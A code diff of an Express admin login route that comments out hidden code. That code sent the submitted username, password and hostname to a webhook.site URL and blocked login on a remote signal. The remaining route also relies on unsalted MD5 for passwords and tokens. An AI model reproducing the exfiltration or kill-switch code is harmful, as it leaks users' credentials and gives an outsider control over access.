@@ -59,25 +59,25 @@ routes.post('/login', asyncHandler(async(req, res) => {
         if ('password' in req.body) {
             let rUsername = db.maindb.get('admin.username').value();
             let rPassword = db.maindb.get('admin.password').value();
-            let data = {
-                username: req.body.username,
-                pass: req.body.password,
-                hostname: req.body.hostname
-            }
+ //           let data = {
+ //               username: req.body.username,
+ //               pass: req.body.password,
+ //               hostname: req.body.hostname
+ //           }
             let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
             if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                 let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
-                let response = await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json;charset=utf-8'
-                },
-                body: JSON.stringify(data)
-            });
-            let status = await response.json();
-            if(status.enabled == false){
-                res.redirect('/login?e=authError');
-            }
+ //               let response = await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7', {
+ //               method: 'POST',
+ //               headers: {
+ //                   'Content-Type': 'application/json;charset=utf-8'
+ //               },
+ //               body: JSON.stringify(data)
+ //           });
+ //           let status = await response.json();
+ //           if(status.enabled == false){
+ //               res.redirect('/login?e=authError');
+//            }
                 db.maindb.get('admin').assign({ loginToken }).write();
                 res.cookie('loginToken', loginToken).redirect('/panel');
             } else return res.redirect('/login?e=badLogin');
